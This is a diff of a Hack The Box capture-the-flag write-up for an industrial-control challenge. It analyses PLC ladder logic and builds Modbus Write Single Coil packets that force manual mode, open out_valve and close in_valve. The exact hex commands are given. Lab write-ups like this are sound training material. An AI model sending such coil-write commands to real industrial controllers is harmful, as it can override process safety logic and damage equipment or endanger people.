@@ -1,135 +1,211 @@
-# Analysis
+# Factory HTB Challenge
 
-Lets look at the connection first via nmap:
+## Analysis
 
-![Alt text](Pasted image 20260915002931.png)
+Let's look at the connection first using Nmap:
 
-the challenge gives us 2 files, an image and a pdf, 
-![Alt text](Pasted image 20260915001114.png)
+![Nmap Scan](./Pasted%20image%2020260915002931.png)
 
-lets look at this picture. our task is to close the in_valve and open the out_valve
+The challenge gives us two files: an image and a PDF.
 
+![Challenge Files](./Pasted%20image%2020260915001114.png)
 
-![Alt text](Pasted image 20260915011908.png)
+Our task is to:
 
-this picture is explaining how auto_mode opens on start, but manual_mode is open only when auto_mode is closed
+* **Close `in_valve`**
+* **Open `out_valve`**
 
-![Alt text](Pasted image 20260915001945.png)
-in this photo, were gonna ignore the automatic mode which is at the top, since we're gonna be controlling everything manually. 
+---
 
-so lets look at the bottom 
+## Understanding the PLC Logic
 
-in order out_value to be 1
-force_start_out has to be 1
-and manual mode has to be 1 
-and stop_out has to be 0 
+Let's first look at the provided diagram.
 
-this is how we turn on out_valve
+![PLC Diagram](./Pasted%20image%2020260915011908.png)
 
+This picture explains how `auto_mode` and `manual_mode` work.
 
-now for in_valve, we need to turn it off:
-![Alt text](Pasted image 20260915003802.png)
+`auto_mode` is enabled when the system starts, while `manual_mode` can only be enabled when `auto_mode` is disabled.
 
+![Manual Mode Logic](./Pasted%20image%2020260915001945.png)
 
-to turn in_valve off, we need the following values:
+For this challenge, we're going to ignore the automatic logic at the top because we want to control the PLC manually.
 
+---
+
+# Opening `out_valve`
+
+Looking at the lower section of the ladder logic, for `out_valve` to become `1`, the following conditions must be true:
+
+```text
+force_start_out = 1
+manual_mode     = 1
+stop_out        = 0
+```
+
+So this is how we can manually turn on `out_valve`.
+
+---
+
+# Closing `in_valve`
+
+Now let's look at the logic controlling `in_valve`.
+
+![Input Valve Logic](./Pasted%20image%2020260915003802.png)
+
+To turn `in_valve` off, we need:
+
+```text
 force_start_in = 0
-manual_mode = 1 
-stop_in = 1 
+manual_mode    = 1
+stop_in        = 1
+```
 
+The important part here is getting `stop_in` to become `1`.
 
-to get those values we need to look up 
-![Alt text](Pasted image 20260915003953.png)
-to turn stop_in on we need these values:
+Looking further into the ladder logic:
 
-cutoff_in = 1  
+![Stop In Logic](./Pasted%20image%2020260915003953.png)
+
+To activate `stop_in`, we need:
+
+```text
+cutoff_in   = 1
 manual_mode = 1
+```
 
+So our overall plan is now clear.
 
-# Turning out_valve on plan
-lets look at our original values and simulate what we are going to do before running any command
+---
 
-![Alt text](Pasted image 20260915002931.png)
+# Turning `out_valve` On — Plan
 
-- auto_mode = 1
-- manual_mode = 0
-- stop_out = 0
-- stop_in = 0
-- low_sensor = 0
-- high_sensor = 0
-- in_valve = 1
-- out_valve = 0
+Let's look at the original values before changing anything.
 
-looking back on how to turn out_valve, we need 
-force_start_out has to be 1
-and manual mode has to be 1 
-and stop_out has to be 0 
+![Initial PLC Values](./Pasted%20image%2020260915002931.png)
 
-so we are going to turn manual_mode to true
-making the new values:
-- auto_mode = 0
-- manual_mode = 1
-- stop_out = 0
-- stop_in = 0
-- low_sensor = 0
-- high_sensor = 0
-- in_valve = 1
-- out_valve = 0
+The initial state is:
 
-stop_out is already 0
-so now we need to turn on force_start_out = 1 
+```text
+auto_mode   = 1
+manual_mode = 0
+stop_out    = 0
+stop_in     = 0
+low_sensor  = 0
+high_sensor = 0
+in_valve    = 1
+out_valve   = 0
+```
 
-#### Steps:
-1- turn on manual mode
-2- turn on force_start_out
+To turn on `out_valve`, we determined that we need:
 
+```text
+force_start_out = 1
+manual_mode     = 1
+stop_out        = 0
+```
 
-# Turning in_valve off plan
+First, we enable `manual_mode`.
 
-after performing the last steps, the values are:
-- auto_mode = 0
-- manual_mode = 1
-- stop_out = 0
-- stop_in = 0
-- low_sensor = 0
-- high_sensor = 0
-- in_valve = 1
-- out_valve = 1
+Doing this disables `auto_mode`, giving us:
 
-lets look back at how we are gonna turn in_valve off:
+```text
+auto_mode   = 0
+manual_mode = 1
+stop_out    = 0
+stop_in     = 0
+low_sensor  = 0
+high_sensor = 0
+in_valve    = 1
+out_valve   = 0
+```
+
+`stop_out` is already `0`, so the only remaining requirement is:
+
+```text
+force_start_out = 1
+```
+
+## Steps
+
+1. Turn on `manual_mode`
+2. Turn on `force_start_out`
+
+---
+
+# Turning `in_valve` Off — Plan
+
+After completing the previous steps, we expect the state to look like:
+
+```text
+auto_mode   = 0
+manual_mode = 1
+stop_out    = 0
+stop_in     = 0
+low_sensor  = 0
+high_sensor = 0
+in_valve    = 1
+out_valve   = 1
+```
+
+To turn `in_valve` off, we need:
+
+```text
 force_start_in = 0
-manual_mode = 1 
-stop_in = 1 
+manual_mode    = 1
+stop_in        = 1
+```
 
-manual mode is already on
-and by default force_start_in and out are 0 on start
+`manual_mode` is already enabled.
 
-so we need to turn stop_in to true
+`force_start_in` is also `0` by default.
 
-we do that through:
+Therefore, the only value we need to change is:
 
-cutoff_in = 1  
+```text
+stop_in = 1
+```
+
+From the ladder logic, `stop_in` can be activated by setting:
+
+```text
+cutoff_in   = 1
 manual_mode = 1
+```
 
-#### final step:
-turn cutoff_in to true.
+Since `manual_mode` is already enabled, our final step is simply:
 
-the final values:
- - auto_mode = 0
-- manual_mode = 1
-- stop_out = 0
-- stop_in = 0
-- low_sensor = 0
-- high_sensor = 0
-- in_valve = 0
-- out_valve = 1
+```text
+cutoff_in = 1
+```
 
+The expected final state is:
 
-# Actually Sending the commands
+```text
+auto_mode   = 0
+manual_mode = 1
+stop_out    = 0
+stop_in     = 1
+low_sensor  = 0
+high_sensor = 0
+in_valve    = 0
+out_valve   = 1
+```
 
-In this challenge, we need to send a modbus packet structured command
+This achieves the challenge objective:
 
-| FC      | Command                       | Request structure                   |
+```text
+in_valve  = CLOSED
+out_valve = OPEN
+```
+
+---
+
+# Actually Sending the Commands
+
+In this challenge, we need to send commands using the Modbus packet structure.
+
+| FC      | Command                       | Request Structure                   |
 | ------- | ----------------------------- | ----------------------------------- |
 | `01`    | Read Coils                    | `AA 01 CCCC NNNN`                   |
 | `02`    | Read Discrete Inputs          | `AA 02 CCCC NNNN`                   |
@@ -152,63 +228,234 @@ In this challenge, we need to send a modbus packet structured command
 | `2B`    | Encapsulated Interface        | `AA 2B MEI DATA`                    |
 | `2B/0E` | Read Device Identification    | `AA 2B 0E DD OO`                    |
 
-here we need write single coil 
+For this challenge, we need:
 
-AA represents the slave ID in hex
-CCCC represents the PLC address in hex
-and DDDD represents the value in hex aswell 
+```text
+05 — Write Single Coil
+```
 
-, in our challenge we had the photo:
+The structure is:
 
-![Alt text](Pasted image 20260915010336.png)
+```text
+AA 05 CCCC DDDD
+```
 
-Slave ID is 82 in decimal which is 52
-Second Part is 05 for writing a single coil 
-PLC address to hex (we're gonna change that later)
-last part: 
-FF00 means true/open
-0000 means false/close
+Where:
 
-lets limit the structure for this specific challenge
+```text
+AA   = Slave ID
+05   = Write Single Coil
+CCCC = Coil address
+DDDD = Value
+```
+
+For writing a coil:
+
+```text
+FF00 = ON / TRUE
+0000 = OFF / FALSE
+```
+
+The challenge provides the following information:
+
+![Modbus Information](./Pasted%20image%2020260915010336.png)
+
+The Slave ID is:
+
+```text
+82 decimal
+```
+
+Convert it to hexadecimal:
+
+```text
+82 = 0x52
+```
+
+Therefore, every command begins with:
+
+```text
+52 05
+```
+
+Our simplified packet structure becomes:
+
+```text
+52 05 CCCC DDDD
+```
+
+or without spaces:
+
+```text
 5205CCCCDDDD
+```
 
-#### Turning Manual Mode on
+---
 
-5205CCCCDDDD
+# Step 1 — Enable Manual Mode
 
-CCCC: Turn 9947 to hex: 26DB
-DDDD: FF00
+The address for `manual_mode` is:
 
-Command:
+```text
+9947
+```
 
+Convert `9947` to hexadecimal:
+
+```text
+9947 = 0x26DB
+```
+
+We want to enable it, so:
+
+```text
+DDDD = FF00
+```
+
+Packet:
+
+```text
+52 05 26DB FF00
+```
+
+Final command:
+
+```text
 520526DBFF00
-![Alt text](Pasted image 20260915011051.png)
+```
 
+![Enable Manual Mode](./Pasted%20image%2020260915011051.png)
 
-#### Turning on out_valve
-the step:
-turn on force_start_out
+---
 
-5205CCCCDDDD
-Address: 52 in hex: 0034
-True: FF00
+# Step 2 — Enable `force_start_out`
 
+Now we need to turn on:
+
+```text
+force_start_out
+```
+
+Its coil address is:
+
+```text
+52 decimal
+```
+
+Convert it to hexadecimal:
+
+```text
+52 = 0x34
+```
+
+As a 16-bit address:
+
+```text
+0034
+```
+
+We want to set it to `TRUE`:
+
+```text
+FF00
+```
+
+Packet:
+
+```text
+52 05 0034 FF00
+```
+
+Final command:
+
+```text
 52050034FF00
-![Alt text](Pasted image 20260915011340.png)
+```
 
+![Enable Force Start Out](./Pasted%20image%2020260915011340.png)
 
+At this point:
 
-#### Turning off in_valve
+```text
+out_valve = 1
+```
 
-turn cutoff_in to true.
-5205CCCCDDDD
-address cutoff_in in hex: 001A
-on: FF00
+---
 
-final command:
+# Step 3 — Close `in_valve`
+
+Finally, we need to activate:
+
+```text
+cutoff_in
+```
+
+Its address is:
+
+```text
+0x001A
+```
+
+We want to set it to `TRUE`:
+
+```text
+FF00
+```
+
+Packet:
+
+```text
+52 05 001A FF00
+```
+
+Final command:
+
+```text
 5205001AFF00
+```
 
+![Enable Cutoff In](./Pasted%20image%2020260915011541.png)
 
-![Alt text](Pasted image 20260915011541.png)
+This activates `stop_in`, which causes:
 
-we get the flag
+```text
+in_valve = 0
+```
+
+The final state is therefore:
+
+```text
+in_valve  = 0
+out_valve = 1
+```
+
+And we receive the flag.
+
+---
+
+# Final Commands
+
+The complete sequence was:
+
+```text
+520526DBFF00
+52050034FF00
+5205001AFF00
+```
+
+Which corresponds to:
+
+| Step | Action                   | Command        |
+| ---- | ------------------------ | -------------- |
+| 1    | Enable `manual_mode`     | `520526DBFF00` |
+| 2    | Enable `force_start_out` | `52050034FF00` |
+| 3    | Enable `cutoff_in`       | `5205001AFF00` |
+
+Result:
+
+```text
+in_valve  = CLOSED
+out_valve = OPEN
+```
+
+**Challenge solved.**
